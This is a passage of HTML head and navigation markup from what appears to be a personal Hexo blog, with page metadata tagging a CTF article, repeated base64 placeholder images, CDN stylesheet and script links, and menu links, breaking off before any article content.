content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="article:published_time" content="2019-11-21T00:37:14.000Z"><meta property="article:modified_time" content="2021-09-27T17:45:58.720Z"><meta property="article:author" content="Zedd"><meta property="article:tag" content="CTF"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.8.1/css/bulma.min.css"><script defer="defer" src="https://at.alicdn.com/t/font_1780077_0ad2sbnz4nz.js"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="/css/style.css"><script>window.ga_tid="UA-112937997-1",window.ga_api="https://blog.zeddyu.info/ga_api/*"</script><script src="https://cdn.jsdelivr.net/npm/cfga@1.0.3" async></script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Zedd's Blog" type="application/atom+xml"></head><body><nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation"><div class="container"><div class="navbar-brand"><div class="navbar-item navbar-logo"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://s.gravatar.com/avatar/204a0c779acdb62f9084826396f6dccb?s=80" alt="" height="28"></div><div class="navbar-burger"><span></span><span></span><span></span></div></div><div class="navbar-menu navbar-start"> <a class="navbar-item" href="/">Index</a> <a class="navbar-item" href="/archives">Archives</a> <a class="navbar-item" href="/categories">Categories</a> <a class="navbar-item" href="/tags">Tags</a> <a class="navbar-item" href="/friends">Friends</a> <a class="navbar-item" 